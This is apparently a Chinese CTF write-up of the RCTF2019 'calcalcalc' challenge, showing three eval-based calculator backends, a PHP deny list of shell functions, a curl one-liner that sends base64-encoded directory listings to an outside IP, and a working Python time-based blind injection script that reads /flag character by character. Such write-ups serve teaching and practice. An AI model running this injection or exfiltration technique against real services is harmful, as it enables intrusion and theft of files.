---
title: '[RCTF2019]calcalcalc'
date: 2025-03-14 19:50:17
tags:
categories: 学习笔记
---

## [RCTF2019]calcalcalc（rce时间盲注）

我们在github上下下来源码

python源码

```py
from flask import Flask, request
import bson
import json
import datetime

app = Flask(__name__)


@app.route("/", methods=["POST"])
def calculate():
    data = request.get_data()
    expr = bson.BSON(data).decode()
    if 'exec' in dir(__builtins__):
        del __builtins__.exec
    return bson.BSON.encode({
        "ret": str(eval(str(expr['expression'])))
    })


if __name__ == "__main__":
    app.run("0.0.0.0", 80)
```

限制了命令执行的函数

php

```php
<?php
ob_start();
$input = file_get_contents('php://input');
$options = MongoDB\BSON\toPHP($input);
$ret = eval('return ' . (string) $options->expression . ';');
echo MongoDB\BSON\fromPHP(['ret' => (string) $ret]);
    
#disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log
#max_execution_time = 1
```



node.js

```js
const express = require('express')
const bson = require('bson')
const bodyParser = require('body-parser')
const cluster = require('cluster')
const app = express()

if (cluster.isMaster) {
  app.use(bodyParser.raw({ inflate: true, limit: '10kb', type: '*/*' }))

  app.post('/', (req, res) => {
    const body = req.body
    const data = bson.deserialize(Buffer.from(body))
    const worker = cluster.fork()
    worker.send(data.expression.toString())
    worker.on('message', (ret) => {
      res.write(bson.serialize({ ret: ret.toString() }))
      res.end()
    })
    setTimeout(() => {
      if (!worker.isDead()) {
        try {
          worker.kill()
        } catch (e) {
        }
      }
      if (!res._headerSent) {
        res.write(bson.serialize({ ret: 'timeout' }))
        res.end()
      }
    }, 1000)
  })

  app.listen(80, () => {
    console.log('Server created')
  })

} else {

  (function () {
    const Module = require('module')
    const _require = Module.prototype.require
    Module.prototype.require = (arg) => {
      if (['os', 'child_process', 'vm', 'cluster'].includes(arg)) {
        return null
      }
      return _require.call(_require, arg)
    }
  })()
  
  process.on('message', msg => {
    const ret = eval(msg)
    process.send(ret)
    process.exit(0)
  })

}

```

 

题目的意思应该是输入一个式子，会同时传到三个后端，当三个后端的计算结果相同是才会生效，否则失败，并且都过滤了个别危险函数库，都做了超时设定。都会直接eval输入的值

```js
validate(value: any, args: ValidationArguments) {
    const str = value ? value.toString() : '';
    if (str.length === 0) {
        return false;
    }
    if (!(args.object as CalculateModel).isVip) {
        if (str.length >= args.constraints[0]) {
            return false;
        }
    }
    if (!/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i.test(str)) {
        return false;
    }
    return true;
}

```

这是对我们的输入进行的正则匹配.

由于代码都先eval再继续判断的，那最多就是看不到那我们是否可以进行flag外带

```
curl ip:23333/`ls | base64`
```

答案是不行的，因为我们在docker-compose.xml文件中发现三个后端用的是内网，所以不能外带数据

那我们应该怎么做

我们发现我们输入命令的话页面总会输出

```
That's classified information. - Asahina Mikuru
```

这种情况我们可以联想到sql注入的时间盲注，我们可以关注前端做出的响应来判断其中某个后端的执行结果是否成功

但我们需要eval(eval())嵌套执行，而且需要用chr()+chr()构造字符

满足上你把要求就是我们写脚本使用的语言，就是python

```py
import requests
import time
x=''
def getpayload(num,mid):
    payload="__import__('time').sleep(5) if (ord(open('/flag','r').read()["+str(num)+"])>"+str(mid)+") else 1"
    data=''
    for i in payload:
        data+='chr('+str(ord(i))+')+'
    return('eval('+data[:-1]+')')
url='http://62e44b9b-0d83-4e04-919b-be0ae81e0a68.node3.buuoj.cn/calculate'
for a in range(0,60):
    max = 130
    min = 30
    while max >=min:
        mid=(max+min)//2
        payload=getpayload(a,mid)
        time1=time.time()
        r = requests.post(url, json={'isVip': True, 'expression': payload})
        time2=time.time()
        if (time2-time1>5):
            min=mid+1
        else:
            max=mid
        if max==mid==min:
            x+=chr(mid)
            print(str(a)+':'+x)
            break
```

用chr()构造字符。然后+拼接。eval执行一次。得到payload。然后再由系统自带的eval执行一次。执行payload
`__import__('time').sleep(5) if 读取文件的第一个字符>xx else 1`
进行盲注

